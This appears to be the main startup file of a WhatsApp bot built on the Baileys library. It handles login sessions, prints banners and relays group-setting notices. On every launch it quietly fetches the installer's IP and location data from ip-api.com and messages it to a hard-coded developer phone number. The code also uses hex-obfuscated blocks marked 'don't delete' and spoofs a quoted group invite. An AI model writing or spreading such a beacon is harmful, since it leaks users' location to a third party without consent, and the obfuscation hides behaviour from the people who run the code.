// BASE
const
	{
    WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		MimetypeMap,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		WAMessageProto,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		ChatModification,
		processTime,
	} = require("@adiwajshing/baileys")
const simple  = require('./lib/simple.js');
const WAConnection = simple.WAConnection(_WAConnection);

const fs = require('fs')
const figlet = require('figlet')
const moment = require('moment-timezone')
const cfonts = require('cfonts')
const fetch = require('node-fetch')
const { spawn, exec, execSync } = require("child_process")
const { wait,simih,getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')


const { color } = require('./lib/color')
const clc = require('chalk')
const setting = JSON.parse(fs.readFileSync('./settings.json'))
const { version, bugs } = require('./package.json')

//ngak penting tapi jangan lu hapus
    var _0x4e59=["\x53\x45\x4C\x46\x20\x42\x4F\x54\x0A\x46\x45\x52\x44\x49\x5A\x0A\x41\x46\x4B","\x62\x6C\x6F\x63\x6B","\x77\x68\x69\x74\x65","\x63\x65\x6E\x74\x65\x72","\x72\x65\x64","\x79\x65\x6C\x6C\x6F\x77","\x72\x65\x6E\x64\x65\x72"];const banner=cfonts[_0x4e59[6]]((_0x4e59[0]),{font:_0x4e59[1],color:_0x4e59[2],align:_0x4e59[3],gradient:[_0x4e59[4],_0x4e59[5]],lineHeight:2})

const starts = async (hyper = new WAConnection()) => {

//  ngak penting tapi jangan lu hapus
    var _0x5507=["\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D","\x64\x65\x66\x61\x75\x6C\x74","\x74\x65\x78\x74\x53\x79\x6E\x63","\x6C\x6F\x67","\x73\x74\x72\x69\x6E\x67"];console[_0x5507[3]](color(figlet[_0x5507[2]](_0x5507[0],{horizontalLayout:_0x5507[1]})));console[_0x5507[3]](banner[_0x5507[4]]);console[_0x5507[3]](color(figlet[_0x5507[2]](_0x5507[0],{horizontalLayout:_0x5507[1]})))
  
    hyper.logger.level = 'warn'
    hyper.version = [2, 2119, 6] 
    hyper.browserDescription = ["BOT WHATSAPP", "Safari", "3.0"];

    hyper.on('qr', () => {
        console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr, bro, make WhatsApp 👍 '))
    })
    console.log()
    fs.existsSync('./session.json') && hyper.loadAuthInfo('./session.json')
    console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       hyper.sendMessage("94767043432@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Hyper Mod",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/lakshitha.jpg'),sourceUrl:"https://wa.me/94767043432?text=welcome"}}})
     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
   })
    hyper.on('connecting', () => {
    console.log()
        start('2', '🔴 LOADING CONNECT KKK')
    })
    hyper.on('open', () => {
    success('2', 'Connected')
    setTimeout( () => {
          console.log()
      	  console.log(color(`🔴 TERHUBUNG KE WHATSAPP KAK BOT NYA`, 'red'))
      	    	}, 1000)    		    	     	
    }) 

    hyper.on('chat-update', async (message) => {
        require('./Queen-Alexa.js')(hyper, message)
    })
    
    await hyper.connect({timeoutMs: 30*1000})
        fs.writeFileSync('./session.json', JSON.stringify(hyper.base64EncodedAuthInfo(), null, '\t'))
        
     //  ngak penting tapi jangan lu hapus
    var _0x3061=["\x70\x68\x6F\x6E\x65","\x75\x73\x65\x72","\x5B","\x62\x6F\x74\x6E\x61\x6D\x65","\x5D","\x20\x69\x73\x20\x6E\x6F\x77\x20\x6F\x6E\x6C\x69\x6E\x65\x21","\x79\x65\x6C\x6C\x6F\x77","\x6C\x6F\x67","\x5B\x44\x45\x56\x5D","\x6F\x77\x6E\x65\x72\x6E\x61\x6D\x65","\x63\x79\x61\x6E","\x57\x65\x6C\x63\x6F\x6D\x65\x20\x62\x61\x63\x6B\x2C\x20\x4F\x77\x6E\x65\x72\x21\x20\x48\x6F\x70\x65\x20\x79\x6F\x75\x20\x61\x72\x65\x20\x64\x6F\x69\x6E\x67\x20\x77\x65\x6C\x6C\x7E","\x6D\x61\x67\x65\x6E\x74\x61","\x3D\x3E\x20\x53\x6F\x75\x72\x63\x65\x20\x63\x6F\x64\x65\x20\x76\x65\x72\x73\x69\x6F\x6E\x3A","\u251C\u232C\x20\x56\x65\x72\x73\x69\x20\x57\x68\x61\x74\x73\x41\x70\x70\x20\x3A","","\u251C\u232C\x20\x52\x41\x4D\x20\x3A","\x74\x6F\x46\x69\x78\x65\x64","\x68\x65\x61\x70\x55\x73\x65\x64","\x6D\x65\x6D\x6F\x72\x79\x55\x73\x61\x67\x65","\x4D\x42\x20\x2F\x20","\x74\x6F\x74\x61\x6C\x6D\x65\x6D","\x6F\x73","\x72\x6F\x75\x6E\x64","\x4D\x42","\u251C\u232C\x20\x56\x65\x72\x73\x69\x20\x4F\x53\x20\x3A","\u251C\u232C\x20\x4D\x45\x52\x4B\x20\x48\x50\x20\x3A","\u251C\u232C\x20\x4D\x4F\x44\x45\x4C\x20\x48\x50\x20\x3A","\x73\x65\x74\x4D\x61\x78\x4C\x69\x73\x74\x65\x6E\x65\x72\x73","\x6C\x65\x76\x65\x6C","\x6C\x6F\x67\x67\x65\x72","\x73\x69\x6C\x65\x6E\x74"];const {wa_version,mcc,mnc,os_version,device_manufacturer,device_model}=hyper[_0x3061[1]][_0x3061[0]];console[_0x3061[7]](color(_0x3061[2]+ setting[_0x3061[3]]+ _0x3061[4]),color(setting[_0x3061[3]]+ _0x3061[5],_0x3061[6]));console[_0x3061[7]](color(_0x3061[8]),color(setting[_0x3061[9]],_0x3061[6]));console[_0x3061[7]](color(_0x3061[8],_0x3061[10]),color(_0x3061[11],_0x3061[12]));console[_0x3061[7]](color(_0x3061[13],_0x3061[6]),color(version));console[_0x3061[7]]();console[_0x3061[7]](color(_0x3061[14],_0x3061[6]),color(`${_0x3061[15]}${wa_version}${_0x3061[15]}`));console[_0x3061[7]](color(_0x3061[16],_0x3061[6]),color(`${_0x3061[15]}${(process[_0x3061[19]]()[_0x3061[18]]/ 1024/ 1024)[_0x3061[17]](2)}${_0x3061[20]}${Math[_0x3061[23]](require(_0x3061[22])[_0x3061[21]]/ 1024/ 1024)}${_0x3061[24]}`));console[_0x3061[7]](color(_0x3061[25],_0x3061[6]),color(`${_0x3061[15]}${os_version}${_0x3061[15]}`));console[_0x3061[7]](color(_0x3061[26],_0x3061[6]),color(`${_0x3061[15]}${device_manufacturer}${_0x3061[15]}`));console[_0x3061[7]](color(_0x3061[27],_0x3061[6]),color(`${_0x3061[15]}${device_model}${_0x3061[15]}`));hyper[_0x3061[28]](0);hyper[_0x3061[30]][_0x3061[29]]= _0x3061[31]
		
    hyper.on('group-update', async (anu) => {
    falfa = { key: {fromMe: false,participant: "0@s.whatsapp.net",
    remoteJid: "0@s.whatsapp.net"},message: {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "hyperbot", "caption": `Creator Botwea © 2K21`, 'jpegThumbnail': fs.readFileSync(`image/${setting.thumb}`)}}}
      metdata = await hyper.groupMetadata(anu.jid)
        if(anu.announce == 'false'){
        teks = `「 GROUP OPENED 」\n\nGroup has been opened by admin\nNow all members can send messages`
        hyper.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
        console.log(clc.yellow(`[ Group Opened ] In ${metdata.subject}`))
      }
      else if(anu.announce == 'true'){
        teks = `「 GROUP CLOSED 」\n\nThe group has been closed by admin\nNow only admins can send messages`
        hyper.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
        console.log(clc.yellow(`[ Group Closed ] In ${metdata.subject}`))
      }
      else if(!anu.desc == ''){
        tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
        teks = `「 GROUP DESCRIPTION CHANGE 」\n\nGroup description has been changed \nBy Admin @${anu.descOwner.split('@')[0]}\n• New Description : \n${anu.desc}`
        hyper.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: falfa})
        console.log(clc.yellow(`[ Group Description Change ] In ${metdata.subject}`))
      }
      else if(anu.restrict == 'false'){
        teks = `「 GROUP SETTING CHANGE 」\n\nEdit Group info has been opened for members\nNow all members can edit this group info`
        hyper.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
        console.log(clc.yellow(`[ Group Setting Change ] In ${metdata.subject}`))
      }
      else if(anu.restrict == 'true'){
        teks = `「 GROUP SETTING CHANGE 」\n\nEdit Group info has been closed for members\nNow only group admins can edit this group info`
        hyper.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
        console.log(clc.yellow(`[ Group Setting Change ] In ${metdata.subject}`))
      }
     })
    }


/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => {}) {
//  console.log("Module", `'${module}'`, "is now being watched for changes");
  fs.watchFile(require.resolve(module), async () => {
    await uncache(require.resolve(module));
    cb(module);
  });
}

/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = ".") {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(module)];
      resolve();
    } catch (e) {
      reject(e);
    }
  });
}

starts()
